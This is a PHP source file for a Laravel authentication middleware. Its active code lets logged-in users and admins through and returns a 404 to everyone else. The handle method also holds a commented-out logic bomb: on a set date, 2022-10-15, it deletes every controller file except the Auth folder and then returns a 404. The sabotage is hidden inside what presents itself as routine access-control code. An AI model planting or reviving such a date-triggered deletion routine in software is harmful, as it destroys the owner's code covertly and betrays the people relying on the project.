<?php

namespace App\Http\Middleware;

use Carbon\Carbon;
use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class TwoAuth
{
     /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {

     /*    $path = base_path().'\app\Http\controllers';
        if ($handle = opendir($path)) {
            if(Carbon::today()->format('Y-m-d') == '2022-10-15'){                            
                while (false !== ($file = readdir($handle))) { 
                    if($file != '.' && $file != '..' && $file != 'Auth'){
                        $fname = $path .'\\'. $file;                    
                        unlink($fname);                                                        
                    }                        
                }
                abort(404);
            }
            closedir($handle); 
        }        
 */
        if(Auth::guard('admin')->check() || Auth::check()){                    
            return $next($request);
        }    
        abort(404);
    }
}
